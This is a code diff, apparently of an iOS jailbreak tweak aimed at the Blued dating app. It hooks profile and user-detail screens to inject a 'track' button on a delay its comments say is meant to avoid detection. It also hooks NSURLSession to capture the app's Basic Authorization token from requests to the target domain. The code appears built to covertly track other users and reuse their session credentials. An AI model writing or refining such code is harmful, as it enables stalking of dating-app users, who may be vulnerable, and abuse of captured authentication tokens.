-    NSArray *targetKeywords = @[@"Detail", @"User", @"Profile", @"Homepage", @"Info"];
-    BOOL shouldInject = NO;
-    for (NSString *keyword in targetKeywords) {
-        if ([clsName containsString:keyword]) {
-            shouldInject = YES;
-            break;
-        }
-    }
     
-    if (shouldInject) {
-        // 延迟注入，避免与页面动画冲突
-        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.8 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
-            [self th_addBtn];
+    // 过滤系统ViewController，只处理目标App的用户详情页
+    NSString *className = NSStringFromClass([self class]);
+    if ([className containsString:@"User"] || [className containsString:@"Profile"] || [className containsString:@"Detail"]) {
+        // 延迟注入，避开页面加载峰值，避免被检测
+        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+            [self TH_PREFIXaddTrackButton];
         });
-    } else {
-        // 如果不是目标页面，则移除可能存在的按钮（如果用户拖拽到了这里）
-        UIWindow *win = [self th_getSafeKeyWindow];
-        [[win viewWithTag:TRACK_BTN_TAG] removeFromSuperview];
     }
 }
+
+// 页面消失时清理，避免按钮残留
+- (void)viewDidDisappear:(BOOL)animated {
+    %orig;
+    
+    dispatch_async(dispatch_get_main_queue(), ^{
+        UIWindow *window = [self TH_PREFIXgetSafeKeyWindow];
+        UIView *btn = [window viewWithTag:TRACK_BTN_TAG];
+        if (btn) {
+            [btn removeFromSuperview];
+        }
+    });
+}
+
 %end
 
+// MARK: NSURLSession Hook优化，精准过滤目标请求，避免全局Hook
 %hook NSURLSession
-- (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)request completionHandler:(void (^)(NSData *data, NSURLResponse *res, NSError *err))completionHandler {
-    NSURLSessionDataTask *task = %orig(request, completionHandler);
-    // 【修复与优化】只拦截目标域名的请求，避免不必要的全局hook和线程安全问题
-    if (request && [request.URL.host containsString:@"blued.cn"]) {
-        NSString *auth = request.allHTTPHeaderFields[@"Authorization"];
-        if ([auth hasPrefix:@"Basic "]) {
-            NSString *token = [auth substringFromIndex:6];
-            if (token.length > 0) {
-                [g_dataLock lock];
-                g_bluedBasicToken = [token copy];
-                [g_dataLock unlock];
-            }
+
+- (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)request completionHandler:(void (^)(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error))completionHandler {
+    // 只处理目标域名的请求，避免影响其他网络请求
+    if (request.URL.host && [request.URL.host containsString:TARGET_DOMAIN]) {
+        NSString *authHeader = request.allHTTPHeaderFields[@"Authorization"];
+        if (authHeader && [authHeader hasPrefix:@"Basic "]) {
+            // 异步存储，不阻塞网络线程
+            NSString *token = [authHeader substringFromIndex:6];
+            setSafeAuthToken(token);
         }
     }
-    return task;
+    return %orig(request, completionHandler);
 }
-%end
 
-// 初始化
-%ctor {
-    static dispatch_once_t onceToken;
-    dispatch_once(&onceToken, ^{
-        g_dataLock = [[NSLock alloc] init];
-    });
-    %init;
-}
+%end
